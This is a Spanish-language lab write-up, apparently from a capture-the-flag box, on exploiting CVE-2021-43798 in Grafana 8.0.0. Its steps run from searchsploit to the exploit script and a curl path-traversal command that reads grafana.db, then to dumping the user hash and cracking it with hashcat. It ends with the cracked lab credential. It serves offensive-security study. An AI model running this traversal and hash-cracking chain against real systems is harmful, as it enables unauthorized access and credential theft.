#CVE-2021-43798

----

Grafana V8.0.0

-------
Entramos a http://10.129.234.47:3000 y tenemos este login panel de grafana y nos muestra que tiene la version v8.0.0
![[Data3.png]]

Vamos a usar [[searchsploit]] con el comando `searchsploit grafana` y vemos que tiene una vulnerabilidad para la version 8.3.0 como tenemos una version anterior a esa suponemos que puede estar la vulnerabilidad activa asi que vamos a descargar el exploit con `searchsploit -m multiple/webapps/50581.py`


![[Data7.png]]

Como indica el titulo del exploit, sirve para realizar un LFI, asi que vamos a buscar en google la ubicaicon de la base datos de grafana y nos da la siguiente ubicacion `/var/lib/grafana/grafana.db`


![[Data17.png]]
Ahora vamos a ejecutar el exploit `python3 50581.py -H http://10.129.234.47:3000` y vamos a leer el archivo `/var/lib/grafana/grafana.db`

![[Data16.png]]

![[Data15.png]]
Vimos como funcionaba el script y lo hicimos de forma manual para descargar el archivo.db ya que cuando lo leiamos la base de datos daba mucho texto y no se entendia bien

Con [[curl]] vamos a descargar la base de datos `curl 'http://10.129.234.47:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db' --path-as-is --output grafana.db` y lo vamos a exportar en un archivo llamado grafana.db
![[Data18.png]]



## Abrir archivo de base de datos con [[sqlite3]]

Usamos el comando `sqlite3 grafana.db` para abrir el archivo de la base de datos
```
.tables                  /Para las tablas
select * from user;      /Para mostrar todo el contenido de la columna user
```

![[Data19.png]]
nos da esto `dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w`
Y un dato importante es que boris se esta conectando por el dominio *data.vl*



## Crackear el hash con [[Hashcat]]

Con [[git clone]] vamos a descargar el repositorio `git clone https://github.com/iamaldi/grafana2hashcat` ya que el grafana no guarda los hashes en una forma estandar

vamos a crear un archivo y poner el hash de la siguiente forma
![[Data20.png]]

```
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
```

Ejecutamos el exploit pasandole el archivo que creamos anteriormente `python3 grafana2hashcat.py hash`
![[Data21.png]]
 Nos da este resultado ``sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=``

Ahora con [[Hashcat]] vamos a crackearlo con el siguiente comando `hashcat -m 10900 crack --wordlist /usr/share/wordlists/rockyou.txt `

![[Data22.png]]
nos dice que la contraseña es  y el usuario es boris
Y nos da la contraseña *beautiful1* del usuario boris
boris:beautiful1
